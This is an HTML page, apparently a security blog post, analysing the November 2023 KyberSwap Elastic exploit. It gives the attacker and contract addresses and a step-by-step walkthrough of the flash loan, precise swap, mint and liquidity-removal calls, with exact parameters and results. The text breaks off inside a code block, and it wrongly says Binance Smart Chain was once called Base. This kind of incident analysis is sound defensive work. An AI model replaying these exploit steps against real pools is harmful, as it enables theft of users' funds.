@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+    <title>
+        
+          KyberSwap Attack Analysis: Unveiling the Most Sophisticated Cyber Heist in History - AntChain Open Labs | Blogs
+        
+    </title>
+
+    <link rel="canonical" href="https://antchainopenlabs.github.io/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/hux-blog.min.css">
+
+
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://openlabs-intl.antdigital.com/home">AntChain Open Labs</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://antchainopenlabs.github.io/img/logo.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/tag-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#Attack Analysis" title="Attack Analysis">Attack Analysis</a>
+                        
+                    </div>
+                    <h1>KyberSwap Attack Analysis: Unveiling the Most Sophisticated Cyber Heist in History</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by AntChain Open Labs on
+                        2023-11-28
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>On November 23, 2023, a Twitter user, Spreek, reported that KyberSwap, a DEX aggregator and liquidity platform, was attacked on multiple chains including Ethereum, Polygon, and Binance Smart Chain, etc, (<a href="https://twitter.com/spreekaway/status/1727462694138024249" target="_blank" rel="noopener">https://twitter.com/spreekaway/status/1727462694138024249</a>), resulting in a loss of approximately $50 million. After the attack, the attacker left a message for KyberSwap, stating his intention to negotiate with the project team after taking a rest. Currently, a notice is visible on the official KyberSwap website alerting users to the attack and advising them to withdraw their funds.</p>
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/01.png" alt="image"></p>
+<p>The crux of the attack lies in the way KyberSwap calculated the maximum amount that could be exchanged within a specific Tick range during a swap transaction. KyberSwap included the transaction fees generated from the swap into the calculation along with the base liquidity, leading to an incorrect computation of the exchangeable amount. This miscalculation ultimately resulted in the liquidity provided by the attacker being added twice. Below, we will conduct a detailed analysis of the attack path.</p>
+<h1 id="Attack-analysis"><a href="#Attack-analysis" class="headerlink" title="Attack analysis"></a>Attack analysis</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>KyberSwap is a DEX aggregator and a hub in the DeFi ecosystem, aggregating over 100 liquidity sources from 15 different chains. It splits and reroutes transactions among these sources, providing users with more favorable swap rates and more convenient cross-chain swaps.</p>
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/02.png" alt="image"><center><i>An example for illustrating tick (<a href="https://docs.kyberswap.com/liquidity-solutions/kyberswap-elastic/concepts/tick-range-mechanism" target="_blank" rel="noopener">https://docs.kyberswap.com/liquidity-solutions/kyberswap-elastic/concepts/tick-range-mechanism</a>)</i></center></p>
+<p>To enable liquidity providers (LPs) to supply liquidity within custom price ranges, KyberSwap has adopted a method similar to that of Uniswap V3, which divides the potential price space into discrete “Ticks.” LPs can provide liquidity between any two Ticks. During a swap transaction, if the price moves beyond the current Tick’s price range, the current Tick shifts to the next one, and the exchange continues at the new price until the requested exchange amount is met or the price limit set by user is reached. In Kyber’s design, switching Ticks changes the pool’s liquidity, a process Kyber defines as “Cross Ticks.” The attack that KyberSwap suffered was closely related to this “Cross Tick” mechanism.</p>
+<p>Additionally, unlike Uniswap V3, Kyber introduced Elastic pools that support reinvestment. These Elastic pools re-add the transaction fees generated by trades back into the pool as liquidity, allowing LPs to earn compound interest on their fees, even when the price moves outside the range of their positions.</p>
+<p>To further illustrate the process of Crossing Ticks, let’s consider a simple example. In the scenario depicted in the diagram above, the pool has three positions: Position 1, shown in orange, has a price range of T1-T6; Position 2, in blue, has a price range of T4-T8; and Position 3, in green, has a price range of T5-T10. Let’s assume the current Tick of the pool is T5. As illustrated, the liquidity at T5 is made up of Positions 1, 2, and 3, and the total liquidity at the current price is 500. If there is a large swap transaction that pushes the current price past T5 and into the range of T4, thereby Crossing Ticks, and since T4 exceeds the price range of Position 3, the liquidity of Position 3 will be removed. As a result, the total liquidity of the pool will then change to 400.</p>
+<p>Similarly, let’s assume the current Tick (currentTick) is T4, and a reverse swap occurs, causing the pool to Cross Tick from T4 to T5. As this movement enters the price range of Position 3, the pool’s liquidity would increase by 100 due to adding in the liquidity from Position 3. Therefore, the total liquidity of the pool would change from 400 to 500.</p>
+<p>In the attack incident, the attacker profited through two exchange transactions. In the first exchange, the attacker swapped WETH for frxETH, moving the price to the right. However, by precisely manipulating the amount exchanged and the price, the attacker skipped the step that would normally deduct liquidity. In the second exchange, the attacker swapped frxETH back to WETH, moving the price to the left. This exchange resulted in an increase in the pool’s liquidity. Effectively, the pool experienced a doubling of its liquidity. Below, we will delve into a detailed analysis of the underlying principles that led to the vulnerability.</p>
+<h2 id="Addresses-involved-in-the-attack"><a href="#Addresses-involved-in-the-attack" class="headerlink" title="Addresses involved in the attack"></a>Addresses involved in the attack</h2><p>This attack involved multiple blockchains including Ethereum, Binance Smart Chain (previously referred to as Base), and Polygon, etc. Here, we will focus on analyzing an example of an attack transaction that occurred on the Ethereum blockchain.</p>
+<p>Attack transaction:</p>
+<blockquote>
+<p><a href="https://etherscan.io/tx/0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3" target="_blank" rel="noopener">https://etherscan.io/tx/0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3</a></p>
+</blockquote>
+<p>Attacker address:</p>
+<blockquote>
+<p>0x50275E0B7261559cE1644014d4b78D4AA63BE836</p>
+</blockquote>
+<p>Attack contract:</p>
+<blockquote>
+<p>0xaF2Acf3D4ab78e4c702256D214a3189A874CDC13</p>
+</blockquote>
+<p>KyberSwap contract (Vulnerable contract):</p>
+<blockquote>
+<p>0xfd7b111aa83b9b6f547e617c7601efd997f64703</p>
+</blockquote>
+<h2 id="Detailed-analysis-–-a-closer-look"><a href="#Detailed-analysis-–-a-closer-look" class="headerlink" title="Detailed analysis – a closer look"></a>Detailed analysis – a closer look</h2><h3 id="Attack-preparation"><a href="#Attack-preparation" class="headerlink" title="Attack preparation"></a>Attack preparation</h3><p>The purpose of the preparation phase for an attack is to provide liquidity in an illiquid Tick range, creating conditions for the attack. The specific steps are as follows:</p>
+<ol>
+<li><p>The attacker borrowed 2000 WETH through a flash loan from Aave V3.</p>
+</li>
+<li><p>The attacker called the <code>swap</code> function of the vulnerable contract and specified <code>limitSqrtP</code> as 20282409603651670423947251286016 (the price at Tick 110909). During the swap process, the swap will halt when either the quantity of tokens swapped reaches <code>swapQty</code> in the parameters, or when the price reaches <code>limitSqrtP</code>. In this case, the swap terminated due to the price reaching the limit, and the attacker ends up exchanging approximately 6.85 WETH for about 6.37 frxETH. Consequently, the price adjusts to 20282409603651670423947251286016, with the currentTick at 110909.</p>
+</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;swap&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;recipient&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;swapQty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2000000000000000000000&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;isToken0&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limitSqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20282409603651670423947251286016&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;deltaQty0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-6371028957698847497&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;deltaQty1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6849615814404497512&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>The attacker transferred approximately 0.0069 frxETH and 0.11 WETH into the pool, providing liquidity with a value of 89631297100385708499 in the specified Tick range [110909, 111310].</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mint&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;token0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x5e8422345238f34275888049021821e8e08caa1f&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;token1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;fee&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;tickLower&quot;</span><span class="punctuation">:</span> <span class="string">&quot;110909&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;tickUpper&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111310&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ticksPrevious&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="string">&quot;48&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="string">&quot;48&quot;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;amount0Desired&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6948087773336076&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;amount1Desired&quot;</span><span class="punctuation">:</span> <span class="string">&quot;107809615846697233&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;amount0Min&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;amount1Min&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;recipient&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;deadline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1700693711&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;tokenId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;359&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;liquidity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;89631297100385708499&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;amount0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6948087773336076&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;amount1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;107809615846697233&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>The attacker then removed a portion of the liquidity that was added in step 3.</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;removeLiquidity&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;tokenId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;359&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;liquidity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14938549516730950591&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;amount0Min&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;amount1Min&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;deadline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1700693711&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;amount0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1158014628889345&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;amount1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17968269307782871&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;additionalRTokenOwed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>At this point, the status of the pool was as follows. It is observed that the remaining liquidity of the attacker in the Tick range [110909, 111310] is 74692747583654757908. This figure has been meticulously calculated by the attacker to ensure that during the first swap of the attack phase, the exact amount required for the swap is achieved. Notably, within this Tick range, the liquidity has been solely provided by the attacker.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;getLiquidityState&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;baseL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;74692747583654757908&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reinvestL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1851411303269421&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reinvestLLast&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1851411303269421&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>With these actions, the attacker has now set the stage with prepared liquidity for the upcoming assault on the Tick range [110909, 111310].</p>
+<h3 id="Making-profit"><a href="#Making-profit" class="headerlink" title="Making profit"></a>Making profit</h3><p>The attacker carried out the attack through two additional swap transactions. Let’s analyze the key logic of the <code>swap</code> function and the attacker’s exploitation logic:</p>
+<p><strong>[The first swap]</strong></p>
+<p>For the first swap transaction, the attacker’s call parameters were set with the intention to exchange approximately 387 WETH for frxETH.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;swap&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;recipient&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;swapQty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;387170294533119999999&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;isToken0&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limitSqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1461446703485210103287273052203988822378723970341&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;deltaQty0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-5789927137555359&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;deltaQty1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;387170294533119999999&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>When the <code>swap</code> function reaches line 22, it retrieves the initialization parameters for the exchange, including the pool’s currentTick, nextTick, and the current price. By examining the transaction, we can see that the current price was 20282409603651670423947251286016, corresponding to a currentTick of 110909 and a nextTick of 111310. Upon reaching line 33 of the <code>swap</code>, the price at Tick 111310 was calculated to be 20693058119558072255662180724088. The Tick range primarily involved in this exchange is precisely the range where the attacker provided liquidity during the preparation phase. The reason the exchange can occur within this range is that the attacker, during the preparation phase, deliberately manipulated the price to correspond with the price at Tick 110909.</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_getInitialSwapData&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;willUpTick&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;baseL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;74692747583654757908&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reinvestL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1851411303269421&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20282409603651670423947251286016&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;currentTick&quot;</span><span class="punctuation">:</span> <span class="string">&quot;110909&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nextTick&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111310&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 